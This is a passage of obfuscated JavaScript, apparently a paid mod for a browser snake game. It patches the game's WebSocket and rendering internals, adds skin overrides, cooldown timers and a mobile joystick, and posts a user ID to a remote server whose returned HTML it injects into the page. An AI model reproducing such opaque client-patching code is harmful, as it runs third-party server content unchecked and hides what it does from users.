                    return "gg_" + _0x4ed1ca.sub;
                  }
                  return _0x277b7e;
                } catch (_0xfd7705) {
                  return _0x277b7e;
                }
              }
              const _0xa3547b = _0x3b8fb0(vps.wuid || window.wup_keycode);
              return fetch(window.vps.s_l + "/extension", {
                headers: {
                  "Content-Type": "application/json",
                  "x-wuid": _0xa3547b,
                  "x-uid": _0xa3547b
                },
                method: "POST",
                body: JSON.stringify({
                  userId: _0xa3547b
                })
              }).then(function (_0xd7f56c) {
                _0xd7f56c.text().then(function (_0x27b149) {
                  $("#modal_wup").html(_0x27b149);
                  $("#op_wup").click(function (_0x19f1e4) {
                    $("#modal_wup").css("display", "block");
                    $("#modal_overlay_wup_fullscreen").css("display", "block");
                    $("#modal_overlay_wup").css("display", "block");
                  });
                  _wup.load_con();
                  _wup.fnSaveGame();
                  _wup.fnSetCounts("start");
                  $("#backgroundArena").change(function () {
                    var _0x312962 = $(this).val();
                    vps.background = _0x312962;
                    vps.backgroundUri = null;
                    _0x380234.xe._g = _0x261341.bgg(_0x312962);
                    localStorage.setItem("SaveGamewup", JSON.stringify(vps));
                    _wup._anApp.og.af.ng.Lg.$g(_0x380234.xe._g);
                    alert("Background changed!");
                  });
                  var _0x31c1c0 = _wup.isNumberValid(vps.idReplaceSkin);
                  if (_0x31c1c0) {
                    $("#inputReplaceSkin").val(vps.idReplaceSkin);
                  } else {
                    var _0x16a2e2 = $("#inputReplaceSkin").val();
                    _0x31c1c0 = _wup.isNumberValid(_0x16a2e2);
                    vps.idReplaceSkin = _0x31c1c0 ? _0x16a2e2 : 33;
                  }
                  if (!vps.joystick) {
                    $("#joystick_checked").val(true);
                    $("#joystick_color").val("red");
                    $("#joystick_mode").val("dynamic");
                    $("#joystick_position").val("L");
                    $("#joystick_size").val(100);
                    $("#joystick_pxy").val(100);
                  } else {
                    $("#joystick_checked").prop("checked", vps.joystick.checked);
                    $("#joystick_color").val(vps.joystick.color);
                    $("#joystick_mode").val(vps.joystick.mode);
                    $("#joystick_position").val(vps.joystick.positionMode);
                    $("#joystick_size").val(vps.joystick.size);
                    $("#joystick_pxy").val(vps.joystick.pxy);
                  }
                });
              });
            case 7:
            case "end":
              return _0x5e26e7.stop();
          }
        }
      }, _0x1fa519);
    }));
    return function _0x3422b4(_0x5645f6, _0x5503bd) {
      return _0x371a69.apply(this, arguments);
    };
  }();
  var _0x52c55d = function _0x196904(_0x472d77) {
    if (vps.PropertyManager) {
      if (vps.PropertyManager.lj) {
        _0x472d77.skinId = vps.PropertyManager.lj;
      }
      if (vps.PropertyManager.mj) {
        _0x472d77.eyesId = vps.PropertyManager.mj;
      }
      if (vps.PropertyManager.nj) {
        _0x472d77.mouthId = vps.PropertyManager.nj;
      }
      if (vps.PropertyManager.pj) {
        _0x472d77.glassesId = vps.PropertyManager.pj;
      }
      if (vps.PropertyManager.oj) {
        _0x472d77.hatId = vps.PropertyManager.oj;
      }
    }
  };
  var _0x10dd7d = function () {
    var _0x474279 = _0x16316f(_0x51aacb().mark(function _0x324a31(_0x1453c1, _0x4f85b1) {
      var _0xac63b;
      var _0x5ce593;
      var _0x57e815;
      var _0x12955c;
      var _0xac458f;
      return _0x51aacb().wrap(function _0x55d88f(_0x12a8c0) {
        while (1) {
          switch (_0x12a8c0.prev = _0x12a8c0.next) {
            case 0:
              $("#mm-params-nickname").prop("maxlength", _0xff4a8c);
              $("#mm-params-nickname").off("blur.nameClean").on("blur.nameClean", function () {
                try {
                  var _0x47ff51 = $(this).val();
                  var _0x172271 = _0x1180ad(_0x47ff51);
                  $(this).val(_0x172271);
                } catch (_0x2508b4) {
                  console.error("خطأ في تنظيف الاسم:", _0x2508b4);
                }
              });
              _0x12a8c0.next = 3;
              return fetch(window.vps.s_l + "/register", {
                headers: {
                  "Content-Type": "application/json",
                  "x-wuid": vps.wuid
                },
                method: "POST",
                body: JSON.stringify(_0x1453c1)
              }).then(function () {
                var _0x5f3a26 = _0x16316f(_0x51aacb().mark(function _0x34ed6c(_0x37964f) {
                  return _0x51aacb().wrap(function _0x119253(_0x5bc11b) {
                    while (1) {
                      switch (_0x5bc11b.prev = _0x5bc11b.next) {
                        case 0:
                          _0x5bc11b.next = 2;
                          return _0x37964f.json();
                        case 2:
                          return _0x5bc11b.abrupt("return", _0x5bc11b.sent);
                        case 3:
                        case "end":
                          return _0x5bc11b.stop();
                      }
                    }
                  }, _0x34ed6c);
                }));
                return function (_0x34749d) {
                  return _0x5f3a26.apply(this, arguments);
                };
              }()).catch(function () {
                $(".description-text").html("Connection problem.");
              });
            case 3:
              _0xac63b = _0x12a8c0.sent;
              if (!_0xac63b) {
                _0xac63b = {};
                _0xac63b.tk = 1;
              }
              vps.tk = _0xac63b.tk;
              _0x5f5546 = _0xac63b.customer;
              if (_0x5f5546 === true && _0xac63b.expiry_date) {
                setTimeout(function () {
                  var _0x13b3fb = "<p id=\"exp_time\" class=\"expiry-date\">Activation: " + _0xac63b.expiry_date + "</p>";
                  $(".description-text").append(_0x13b3fb);
                }, 200);
              }
              _0x1453c1.propertyList = _0xac63b.propertyList;
              _0x4f85b1(_0x1453c1);
              _0x62a18c(_0xac63b);
              window.lastSkinData = _0xac63b;
              _wup._anApp = _0x380234;
              _wup._tx = function (_0x2cc7c3) {
                Object.keys(_0x2cc7c3).forEach(function (_0x411b58) {
                  if (_0x2cc7c3[_0x411b58].Yi) {
                    _0x2cc7c3[_0x411b58].fj.nh.Cc.xc.width = _0x2cc7c3[_0x411b58].fj.nh.Cc.xc.width + 2;
                    _0x2cc7c3[_0x411b58].fj.nh.Cc.xc.height = _0x2cc7c3[_0x411b58].fj.nh.Cc.xc.height + 2;
                  }
                });
              };
              _wup.Zp = _0x380234.dh.Zp;
              _0x380234.dh.Dq = function (_0x2002b9, _0x43f527, _0x467d94 = 0) {
                try {
                  var _0xbe0f67 = _0x380234.dh;
                  var _0x288294 = {};
                  if (_0x288294.connected && _0x288294.connected === "force_refresh") {
                    alert("Update Page...");
                    _0xbe0f67.Cq();
                    return;
                  }
                  _0xbe0f67.mq = new WebSocket(_0x2002b9);
                  _0xbe0f67.mq.binaryType = "arraybuffer";
                  _0x1de86b = _wup.ismobile ? 1.25 : 1;
                  vps.start = new Date();
                  vps.con = _0x2002b9;
                  _0x24f576 = {};
                  window.gameIntervals = [];
                  _0x261341.setIntervalRun = setInterval(function () {
                    _0x261341.ps3();
                  }, 20);
                  window.gameIntervals.push(_0x261341.setIntervalRun);
                  window.addEventListener("beforeunload", function () {
                    window.gameIntervals.forEach(_0x8939af => clearInterval(_0x8939af));
                    window.gameIntervals = [];
                  });
                  _0xbe0f67.mq.onopen = function () {
                    _0x504f56();
                    _wup.fnSetCounts("open");
                    _0x43f527();
                  };
                  _0xbe0f67.mq.onclose = function () {
                    _0x4e50ba();
                    _wup.fnSetCounts("close");
                    _wup.stopGame();
                    setTimeout(() => {
                      if (window.lastSkinData && window.lastSkinData.propertyList) {
                        const _0x461fa9 = $("#mm-params-nickname").val();
                        _0x1453c1.propertyList = window.lastSkinData.propertyList;
                        if (_0x461fa9 && _0x461fa9.trim() !== "") {
                          _0x1453c1.nickname = _0x461fa9;
                        }
                        _0x4f85b1(_0x1453c1);
                        $("#mm-params-nickname").val(_0x461fa9);
                      }
                    }, 1000);
                    clearInterval(_0x261341.setIntervalRun);
                    _0x261341.loadBg = false;
                    vps.start = 0;
                  };
                  _0xbe0f67.mq.onerror = function (_0x31c798) {
                    _0x4e50ba();
                    _wup.fnSetCounts("close");
                    _wup.stopGame();
                    clearInterval(_0x261341.setIntervalRun);
                    _0x261341.loadBg = false;
                    vps.start = 0;
                    if (_0x467d94 > 4) {
                      _0xbe0f67.Cq();
                    } else {
                      setTimeout(function () {
                        _0x467d94++;
                        console.log("Reconnect server");
                        _0x380234.dh.Dq(vps.con, _0x43f527, _0x467d94);
                      }, 2000);
                    }
                  };
                  _0xbe0f67.mq.onmessage = function (_0x24dd03) {
                    _0xbe0f67.Kp.Ph(_0x24dd03.data);
                  };
                } catch (_0x1d4f7f) {
                  console.log(_0x1d4f7f);
                  _0x380234.dh.Cq();
                }
              };
              _0x380234.dh.Kp.Yh = function (_0x170912, _0x2c80dc) {
                _0x4e50ba();
                this.dh.Oi();
              };
              _0x380234.og.af.ng.Ug.Uf = function (_0x437bcd) {
                var _0x270930 = function () {
                  return _0x261341.$F.M(_0x261341.POGL.Sprite, function () {
                    _0x261341.POGL.Sprite.call(this);
                    this.sh = 0;
                  });
                }();
                for (var _0x36fe77 in this.rh) {
                  if (_0x437bcd[_0x36fe77] == null || !_0x437bcd[_0x36fe77].hd) {
                    _0x261341.$F.U(this.rh[_0x36fe77]);
                    delete this.rh[_0x36fe77];
                  }
                }
                var _0x4749dc = 0;
                var _0x2ca03d = 1;
                for (var _0x3684e2 in _0x437bcd) {
                  var _0x39f55e = _0x437bcd[_0x3684e2];
                  if (_0x39f55e.hd) {
                    var _0x5522b0 = this.rh[_0x3684e2];
                    if (!_0x5522b0) {
                      var _0xee72a8 = _0x380234.Lc.Ub().pb(_0x39f55e.nd).ub;
                      _0x5522b0 = new _0x270930();
                      _0x5522b0.texture = _0xee72a8.Ea();
                      _0x5522b0.width = 39;
                      _0x5522b0.height = 39;
                      this.rh[_0x3684e2] = _0x5522b0;
                      this.addChild(_0x5522b0);
                    }
                    ctxx.setPtc(this, _0x3684e2, _0x39f55e.od);
                    _0x5522b0.sh = _0x39f55e.od;
                    var _0xff1f35 = _0x2ca03d || window.innerWidth;
                    var _0x2dd028 = vps.hudSettings.mode == 0 ? _0x4749dc : _0xff1f35 / 2 + _0x4749dc - _0xff1f35 * vps.hudSettings.wi;
                    _0x5522b0.position.x = _0x2dd028 + 5;
                    _0x5522b0.position.y = _0x5522b0.position.y;
                    _0x4749dc += 40;
                  }
                }
              };
              _0x380234.og.af.ng.Tg.addChild(ctxx.clock);
              _0x380234.og.af.ng.Tg.addChild(ctxx.containerCountInfo);
              ctxx.ptc = {};
              _0x5ce593 = [30, 30, 30, 80, 40, 20, 30];
              for (_0x57e815 = 0; _0x57e815 < _0x5ce593.length; _0x57e815++) {
                _0x12955c = "clock_ad" + _0x57e815;
                ctxx.ptc[_0x12955c] = new PIXI.Text(_0x5ce593[_0x57e815], ctxx.fontStyle["tfc" + _0x57e815]);
                ctxx.ptc[_0x12955c].y = 55;
              }
              window.powerPulseEnabled = false;
              function _0x11798e() {
                if (typeof vps !== "undefined" && vps.powerPulseEnabled !== undefined) {
                  window.powerPulseEnabled = vps.powerPulseEnabled;
                  return;
                }
                const _0x1f49bd = localStorage.getItem("ctxx_powerPulseEnabled");
                if (_0x1f49bd !== null) {
                  window.powerPulseEnabled = _0x1f49bd === "true";
                  return;
                }
                window.powerPulseEnabled = false;
              }
              function _0x46e9ea() {
                localStorage.setItem("ctxx_powerPulseEnabled", window.powerPulseEnabled.toString());
              }
              _0x11798e();
              function _0x3702f0() {
                if (!window.powerPulseEnabled || !ctxx || !ctxx.ptc) {
                  ["clock_ad0", "clock_ad1"].forEach(_0x14ec79 => {
                    if (ctxx && ctxx.ptc && ctxx.ptc[_0x14ec79] && ctxx.ptc[_0x14ec79]._pulseStarted) {
                      _0x360f6e(ctxx.ptc[_0x14ec79]);
                    }
                  });
                  return;
                }
                ["clock_ad0", "clock_ad1"].forEach(_0x4ce37e => {
                  const _0x6ce52e = ctxx.ptc[_0x4ce37e];
                  if (!_0x6ce52e || !_0x6ce52e.text) {
                    return;
                  }
                  const _0x7280f3 = parseInt(_0x6ce52e.text);
                  if (!isNaN(_0x7280f3) && _0x7280f3 > 0 && _0x7280f3 <= 5) {
                    _0x3e843f(_0x6ce52e);
                  } else {
                    _0x360f6e(_0x6ce52e);
                  }
                });
              }
              function _0x3e843f(_0x39fa91) {
                if (!_0x39fa91 || _0x39fa91._pulseStarted) {
                  return;
                }
                _0x39fa91._originalStyle = {
                  fill: _0x39fa91.style.fill,
                  fontSize: _0x39fa91.style.fontSize,
                  dropShadow: _0x39fa91.style.dropShadow,
                  dropShadowColor: _0x39fa91.style.dropShadowColor,
                  dropShadowDistance: _0x39fa91.style.dropShadowDistance,
                  dropShadowBlur: _0x39fa91.style.dropShadowBlur,
                  stroke: _0x39fa91.style.stroke,
                  strokeThickness: _0x39fa91.style.strokeThickness
                };
                _0x39fa91._originalX = _0x39fa91.x;
                _0x39fa91._pulseStarted = true;
                _0x39fa91._lastPulseTime = 0;
                _0x39fa91._pulseInterval = setInterval(() => {
                  if (!_0x39fa91 || !_0x39fa91.style) {
                    clearInterval(_0x39fa91._pulseInterval);
                    return;
                  }
                  const _0x122b6d = Date.now();
                  if (_0x122b6d - _0x39fa91._lastPulseTime > 800) {
                    _0x39fa91._lastPulseTime = _0x122b6d;
                    const _0x1aad32 = _0x39fa91._originalStyle.fill;
                    const _0x1362e7 = _0x39fa91.x;
                    _0x39fa91.style.fontSize = (_0x39fa91._originalStyle.fontSize || 20) + 12;
                    _0x39fa91.x = _0x39fa91._originalX - 0;
                    _0x39fa91.style.stroke = "#FF0000";
                    _0x39fa91.style.strokeThickness = 1;
                    _0x39fa91.style.dropShadow = true;
                    _0x39fa91.style.dropShadowColor = "#FF0000";
                    _0x39fa91.style.dropShadowDistance = 5;
                    _0x39fa91.style.dropShadowBlur = 6;
                    _0x39fa91.x = _0x1362e7;
                    setTimeout(() => {
                      if (!_0x39fa91 || !_0x39fa91.style || !_0x39fa91._pulseStarted) {
                        return;
                      }
                      const _0x17ccfc = _0x39fa91.x;
                      _0x39fa91.style.fill = _0x39fa91._originalStyle.fill;
                      _0x39fa91.style.fontSize = _0x39fa91._originalStyle.fontSize;
                      _0x39fa91.style.dropShadow = _0x39fa91._originalStyle.dropShadow;
                      _0x39fa91.style.dropShadowColor = _0x39fa91._originalStyle.dropShadowColor;
                      _0x39fa91.style.dropShadowDistance = _0x39fa91._originalStyle.dropShadowDistance;
                      _0x39fa91.style.dropShadowBlur = _0x39fa91._originalStyle.dropShadowBlur;
                      _0x39fa91.style.stroke = _0x39fa91._originalStyle.stroke;
                      _0x39fa91.style.strokeThickness = _0x39fa91._originalStyle.strokeThickness;
                      _0x39fa91.x = _0x17ccfc;
                    }, 400);
                  }
                }, 100);
              }
              function _0x360f6e(_0x332658) {
                if (!_0x332658 || !_0x332658._pulseStarted) {
                  return;
                }
                if (_0x332658._pulseInterval) {
                  clearInterval(_0x332658._pulseInterval);
                  _0x332658._pulseInterval = null;
                }
                _0x332658._pulseStarted = false;
                if (_0x332658._originalStyle && _0x332658.style) {
                  _0x332658.style.fill = _0x332658._originalStyle.fill;
                  _0x332658.style.fontSize = _0x332658._originalStyle.fontSize;
                  _0x332658.style.dropShadow = _0x332658._originalStyle.dropShadow;
                  _0x332658.style.dropShadowColor = _0x332658._originalStyle.dropShadowColor;
                  _0x332658.style.dropShadowDistance = _0x332658._originalStyle.dropShadowDistance;
                  _0x332658.style.dropShadowBlur = _0x332658._originalStyle.dropShadowBlur;
                  _0x332658.style.stroke = _0x332658._originalStyle.stroke;
                  _0x332658.style.strokeThickness = _0x332658._originalStyle.strokeThickness;
                }
              }
              function _0x2401bc() {
                window.powerPulseEnabled = !window.powerPulseEnabled;
                _0x46e9ea();
                return window.powerPulseEnabled;
              }
              ctxx.setPtc = function (_0x5252f2, _0x344d43, _0x548b73) {
                try {
                  var _0x22c3be = _0x5ce593[_0x344d43] - parseInt((_0x548b73 == 0.99 ? 1 : _0x548b73) * _0x5ce593[_0x344d43] / 1);
                  var _0x129a61 = "clock_ad" + _0x344d43;
                  if (!_0x5252f2 || !_0x5252f2.rh || !_0x5252f2.rh[_0x344d43]) {
                    return;
                  }
                  if (!ctxx.ptc || !ctxx.ptc[_0x129a61]) {
                    return;
                  }
                  const _0x7200a0 = ctxx.ptc[_0x129a61];
                  const _0x15e7ed = _0x5252f2.rh[_0x344d43];
                  if (_0x7200a0.parent !== _0x15e7ed) {
                    if (_0x7200a0.parent) {
                      _0x7200a0.parent.removeChild(_0x7200a0);
                    }
                    _0x15e7ed.addChild(_0x7200a0);
                  }
                  _0x7200a0.x = _0x22c3be >= 100 ? 8 : _0x22c3be >= 10 ? 15 : 23;
                  _0x7200a0.text = _0x22c3be;
                  _0x7200a0.visible = true;
                  _0x7200a0.alpha = 1;
                  if (_0x344d43 === 0 || _0x344d43 === 1) {
                    setTimeout(_0x3702f0, 50);
                  }
                } catch (_0x4eda6a) {
                  console.error("Error in setPtc:", _0x4eda6a);
                }
              };
              function _0x4ee67a() {
                if (typeof ctxx !== "undefined" && ctxx.ptc) {
                  setInterval(_0x3702f0, 200);
                } else {
                  setTimeout(_0x4ee67a, 1000);
                }
              }
              _0x4ee67a();
              window.addEventListener("beforeunload", function () {
                if (ctxx && ctxx.ptc) {
                  ["clock_ad0", "clock_ad1"].forEach(_0xbf4431 => {
                    const _0xee1770 = ctxx.ptc[_0xbf4431];
                    if (_0xee1770 && _0xee1770._pulseStarted && _0xee1770._pulseInterval) {
                      clearInterval(_0xee1770._pulseInterval);
                    }
                  });
                }
              });
              _0xac458f = _0x380234.og.af.ng.Eb;
              gtr.onmovepoint = function (_0x353f51) {
                if (_0x353f51.pointerType === "touch" && !_0x353f51.isPrimary) {
                  return;
                }
                if (_0x353f51.clientX !== undefined) {
                  _0x380234.og.af.Bn = Math.atan2(_0x353f51.clientY - _0xac458f.offsetHeight * 0.5, _0x353f51.clientX - _0xac458f.offsetWidth * 0.5);
                } else {
                  _0x380234.og.af.Bn = Math.atan2(_0x353f51.pageY - _0xac458f.offsetHeight * 0.5, _0x353f51.pageX - _0xac458f.offsetWidth * 0.5);
                }
              };
              gtr.onRun = function (_0xc5ebd3) {
                if (_0xc5ebd3 && _0xc5ebd3.pointerType === "touch") {
                  return;
                }
                _0x380234.og.af.An = true;
              };
              gtr.onStop = function (_0x3448f3) {
                if (_0x3448f3 && _0x3448f3.pointerType === "touch") {
                  return;
                }
                _0x380234.og.af.An = false;
              };
              _0xac458f.addEventListener("pointermove", gtr.onmovepoint, true);
              _0xac458f.addEventListener("pointerdown", gtr.onRun, true);
              _0xac458f.addEventListener("pointerup", gtr.onStop, true);
              if (_wup.ismobile) {
                _0xac458f.addEventListener("touchstart", function (_0x7ccaa5) {
                  if (_0x7ccaa5 = _0x7ccaa5 || window.event) {
                    const _0x302586 = _0x7ccaa5.touches.length;
                    if (_0x302586 >= 2) {
                      _0x380234.og.af.An = true;
                    }
                    window.touchState = {
                      isMultiTouch: _0x302586 >= 2,
                      touchCount: _0x302586
                    };
                  }
                  _0x7ccaa5.preventDefault();
                }, true);
                _0xac458f.addEventListener("touchend", function (_0x47f276) {
                  if (_0x47f276 = _0x47f276 || window.event) {
                    const _0x1db029 = _0x47f276.touches.length;
                    if (_0x1db029 < 2) {
                      _0x380234.og.af.An = false;
                    }
                    window.touchState = {
                      isMultiTouch: _0x1db029 >= 2,
                      touchCount: _0x1db029
                    };
                  }
                }, true);
              }
            case 35:
            case "end":
              return _0x12a8c0.stop();
          }
        }
      }, _0x324a31);
    }));
    return function _0x310efb(_0x5b4c3e, _0x5b0aaf) {
      return _0x474279.apply(this, arguments);
    };
  }();
  function _0x2d12c2() {
    var _0x4cee10 = document.createElement("div");
    _0x4cee10.style.position = "fixed";
    _0x4cee10.style.top = "0";
    _0x4cee10.style.height = "100%";
    _0x4cee10.style.width = "100%";
    _0x4cee10.style.zIndex = "1000";
    _0x4cee10.id = "zone_joystick";
    document.body.appendChild(_0x4cee10);
  }
  function _0x1f464a() {
    var _0x85b7a8 = document.getElementById("zone_joystick");
    if (_0x85b7a8) {
      _0x85b7a8.remove();
    }
  }
  var _0x4e50ba = function _0x6c9617() {
    if (_0x247e3c) {
      try {
        _0x247e3c.destroy();
        _0x247e3c = null;
      } catch (_0x329c64) {}
      $("#up-mobile-box").remove();
      $("#up-mobile-box-slider").remove();
    }
    _0x1f464a();
    const _0xb2f8c7 = ["img_1", "img_2", "img_3", "img_4", "img_o_2", "img_o_3", "img_o_4", "img_i_2", "img_i_3", "img_p_1", "img_p_2", "img_p_3", "img_p_4", "img_p_5", "img_f", "img_pf_1"];
    _0xb2f8c7.forEach(_0x5564fa => {
      const _0x2bb965 = document.getElementById(_0x5564fa);
      if (_0x2bb965) {
        _0x2bb965.remove();
      }
    });
  };
  var _0x504f56 = function _0x19d580() {
    try {
      var _0x195948 = function _0x409c2b() {
        _0x247e3c.on("start end", function (_0x143abf, _0x362550) {}).on("move", function (_0x5eff3d, _0x5336ab) {
          var _0x4dda22 = _0x5336ab.angle.radian <= Math.PI ? _0x5336ab.angle.radian * -1 : Math.PI - (_0x5336ab.angle.radian - Math.PI);
          _0x380234.og.af.Bn = _0x4dda22;
        });
      };
      var _0x2029a5 = function _0x5c0d3c() {
        if (_0x247e3c) {
          _0x247e3c.destroy();
        }
        _0x2d12c2();
        const _0x3fce78 = window.innerWidth;
        const _0x16a746 = window.innerHeight;
        const _0x2898e7 = {
          id: "img_6",
          src: atob(savedImages[9]),
          width: 50,
          height: 25,
          x: _0x3fce78 * 0.75 - 25,
          y: 0,
          alpha: 1,
          clickable: true
        };
        gtr.createJoystickElement(_0x2898e7);
        var _0x2922e3 = _0x565fbe({}, vps.joystick);
        var _0x1cf9e4 = {};
        let _0x7f3e06 = false;
        if (_0x2922e3.mode === "static") {
          delete _0x2922e3.zone;
          _0x2922e3.position = {
            left: "95px",
            bottom: "140px"
          };
        } else {
          _0x2922e3.zone = document.getElementById("zone_joystick");
          _0x2922e3.mode = "dynamic";
          delete _0x2922e3.position;
        }
        _0x247e3c = nipplejs.create(_0x2922e3);
        _0x247e3c.on("start end", function (_0x167618, _0x33137e) {
          setTimeout(() => {
            const _0xcc4a32 = document.getElementById("zone_joystick");
            if (_0xcc4a32) {
              _0xcc4a32.addEventListener("touchstart", function (_0x116796) {
                if (_0x116796.touches.length >= 2 && !_0x7f3e06) {
                  _0x7f3e06 = true;
                  _0x380234.og.af.An = true;
                }
              }, {
                passive: false
              });
              _0xcc4a32.addEventListener("touchmove", function (_0x3ed663) {
                if (_0x3ed663.touches.length >= 2 && !_0x7f3e06) {
                  _0x7f3e06 = true;
                  _0x380234.og.af.An = true;
                } else if (_0x3ed663.touches.length < 2 && _0x7f3e06) {
                  _0x7f3e06 = false;
                  _0x380234.og.af.An = false;
                }
              }, {
                passive: false
              });
              _0xcc4a32.addEventListener("touchend", function (_0x4c011a) {
                if (_0x4c011a.touches.length < 2 && _0x7f3e06) {
                  _0x7f3e06 = false;
                  _0x380234.og.af.An = false;
                }
              }, {
                passive: false
              });
            }
          }, 100);
        }).on("move", function (_0x1128b0, _0x5f234c) {
          var _0x4eb388 = _0x5f234c.angle.radian <= Math.PI ? _0x5f234c.angle.radian * -1 : Math.PI - (_0x5f234c.angle.radian - Math.PI);
          _0x380234.og.af.Bn = _0x4eb388;
        });
      };
      gtr.createNewJoystick = function (_0x5e30b1) {
        _0x2d12c2();
        const _0x6ca759 = window.innerWidth;
        const _0x3425ac = window.innerHeight;
        const _0x5244e2 = gtr.getJoystickConfig(_0x5e30b1, _0x6ca759, _0x3425ac);
        const _0x1abcdc = _0x5244e2.find(_0x35b7ad => _0x35b7ad.clickable);
        if (_0x1abcdc) {
          _0x1abcdc.x = _0x6ca759 * 0.75 - 25;
          _0x1abcdc.y = 0;
          _0x1abcdc.alpha = 1;
          gtr.createJoystickElement(_0x1abcdc);
        }
        const _0x8252f3 = gtr.getJoystickConfig(_0x5e30b1, _0x6ca759, _0x3425ac);
        _0x8252f3.forEach(_0x1e4621 => {
          if (!_0x1e4621.clickable) {
            gtr.createJoystickElement(_0x1e4621);
          }
        });
        gtr.bindJoystickControls(_0x5e30b1);
      };
      gtr.getJoystickConfig = function (_0x127a8a, _0x1aaf02, _0xcc3ba7) {
        const _0x4f80d6 = {
          1: [{
            id: "img_1",
            src: atob(savedImages[9]),
            width: 50,
            height: 25,
            x: _0x1aaf02 * 0.75 - 25,
            y: 0,
            alpha: 1,
            clickable: true
          }, {
            id: "img_p_1",
            src: atob(savedImages[19]),
            width: 16,
            height: 16,
            x: _0x1aaf02 * 0.5 - 8,
            y: _0xcc3ba7 * 0.5 - 8,
            alpha: 0.25
          }],
          2: [{
            id: "img_2",
            src: atob(savedImages[10]),
            width: 50,
            height: 25,
            x: _0x1aaf02 * 0.75 - 25,
            y: 0,
            alpha: 1,
            clickable: true
          }, {
            id: "img_o_2",
            src: atob(savedImages[14]),
            width: 100,
            height: 100,
            x: 45,
            y: _0xcc3ba7 - 180,
            alpha: 0.25
          }, {
            id: "img_i_2",
            src: atob(savedImages[17]),
            width: 50,
            height: 50,
            x: 70,
            y: _0xcc3ba7 - 155,
            alpha: 0.25
          }, {
            id: "img_p_2",
            src: atob(savedImages[21]),
            width: 16,
            height: 16,
            x: _0x1aaf02 * 0.5 - 8,
            y: _0xcc3ba7 * 0.5 - 8,
            alpha: 0.25
          }],
          3: [{
            id: "img_3",
            src: atob(savedImages[11]),
            width: 50,
            height: 25,
            x: _0x1aaf02 * 0.75 - 25,
            y: 0,
            alpha: 1,
            clickable: true
          }, {
            id: "img_o_3",
            src: atob(savedImages[15]),
            width: 100,
            height: 100,
            x: 45,
            y: _0xcc3ba7 - 180,
            alpha: 0.25
          }, {
            id: "img_i_3",
            src: atob(savedImages[18]),
            width: 50,
            height: 50,
            x: 70,
            y: _0xcc3ba7 - 155,
            alpha: 0.25
          }, {
            id: "img_p_3",
            src: atob(savedImages[22]),
            width: 16,
            height: 16,
            x: _0x1aaf02 * 0.5 - 8,
            y: _0xcc3ba7 * 0.5 - 8,
            alpha: 0.25
          }],
          4: [{
            id: "img_4",
            src: atob(savedImages[12]),
            width: 50,
            height: 25,
            x: _0x1aaf02 * 0.75 - 25,
            y: 0,
            alpha: 1,
            clickable: true
          }, {
            id: "img_o_4",
            src: atob(savedImages[16]),
            width: 100,
            height: 100,
            x: 15,
            y: _0xcc3ba7 - 210,
            alpha: 1
          }, {
            id: "img_f",
            src: atob(savedImages[13]),
            width: 60,
            height: 60,
            x: _0x1aaf02 - 100,
            y: _0xcc3ba7 - 120,
            alpha: 0.7
          }, {
            id: "img_p_4",
            src: atob(savedImages[21]),
            width: 16,
            height: 16,
            x: _0x1aaf02 * 0.5 - 8,
            y: _0xcc3ba7 * 0.5 - 8,
            alpha: 0.25
          }, {
            id: "img_pf_1",
            src: atob(savedImages[20]),
            width: 16,
            height: 16,
            x: _0x1aaf02 * 0.5 - 8,
            y: _0xcc3ba7 * 0.5 - 8,
            alpha: 0,
            display: "none"
          }],
          5: [{
            id: "img_4",
            src: atob(savedImages[12]),
            width: 50,
            height: 25,
            x: _0x1aaf02 * 0.75 - 25,
            y: 0,
            alpha: 1,
            clickable: true
          }, {
            id: "img_o_4",
            src: atob(savedImages[16]),
            width: 100,
            height: 100,
            x: _0x1aaf02 - 115,
            y: _0xcc3ba7 - 210,
            alpha: 1
          }, {
            id: "img_f",
            src: atob(savedImages[13]),
            width: 60,
            height: 60,
            x: 20,
            y: _0xcc3ba7 - 120,
            alpha: 0.7
          }, {
            id: "img_p_5",
            src: atob(savedImages[21]),
            width: 16,
            height: 16,
            x: _0x1aaf02 * 0.5 - 8,
            y: _0xcc3ba7 * 0.5 - 8,
            alpha: 0.25
          }, {
            id: "img_pf_1",
            src: atob(savedImages[20]),
            width: 16,
            height: 16,
            x: _0x1aaf02 * 0.5 - 8,
            y: _0xcc3ba7 * 0.5 - 8,
            alpha: 0,
            display: "none"
          }],
          6: [{
            id: "img_6",
            src: atob(savedImages[9]),
            width: 50,
            height: 25,
            x: _0x1aaf02 * 0.75 - 25,
            y: 0,
            alpha: 1,
            clickable: true
          }, {
            id: "img_p_6",
            src: atob(savedImages[19]),
            width: 16,
            height: 16,
            x: _0x1aaf02 * 0.5 - 8,
            y: _0xcc3ba7 * 0.5 - 8,
            alpha: 0.25
          }]
        };
        return _0x4f80d6[_0x127a8a] || _0x4f80d6[1];
      };
      gtr.createJoystickElement = function (_0x5bea8a) {
        const _0x2d74ca = document.getElementById("zone_joystick");
        if (!_0x2d74ca) {
          return;
        }
        const _0x301e37 = document.createElement("img");
        _0x301e37.id = _0x5bea8a.id;
        _0x301e37.src = _0x5bea8a.src;
        _0x301e37.style.cssText = "\n            position: absolute;\n            width: " + _0x5bea8a.width + "px;\n            height: " + _0x5bea8a.height + "px;\n            left: " + _0x5bea8a.x + "px;\n            top: " + _0x5bea8a.y + "px;\n            opacity: " + (_0x5bea8a.alpha || 1) + ";\n            display: " + (_0x5bea8a.display || "block") + ";\n            pointer-events: " + (_0x5bea8a.clickable ? "auto" : "none") + ";\n            user-select: none;\n            z-index: " + (_0x5bea8a.clickable ? "9999" : "1001") + ";\n            cursor: " + (_0x5bea8a.clickable ? "pointer" : "default") + ";\n          ";
        if (_0x5bea8a.clickable) {
          _0x301e37.onclick = function (_0x5804f1) {
            _0x5804f1.stopPropagation();
            _0x5804f1.preventDefault();
            const _0x384f0f = vps.joystickType || 1;
            const _0x336a5a = _0x384f0f === 6 ? 1 : _0x384f0f + 1;
            vps.joystickType = _0x336a5a;
            localStorage.setItem("SaveGamewup", JSON.stringify(vps));
            gtr.clearAllJoystickElements();
            if (_0x336a5a === 6) {
              _0x2029a5();
            } else {
              gtr.createNewJoystick(_0x336a5a);
            }
          };
          _0x301e37.addEventListener("touchstart", function (_0x58d63d) {
            _0x58d63d.stopPropagation();
            _0x58d63d.preventDefault();
            _0x301e37.click();
          }, {
            passive: false
          });
        }
        _0x2d74ca.appendChild(_0x301e37);
      };
      gtr.bindJoystickControls = function (_0x3d43b9) {
        const _0xc18ed6 = document.getElementById("zone_joystick");
        if (!_0xc18ed6) {
          return;
        }
        let _0x1cec22 = false;
        let _0x41a7de = 0;
        let _0x46892e = 0;
        let _0x332cc8 = false;
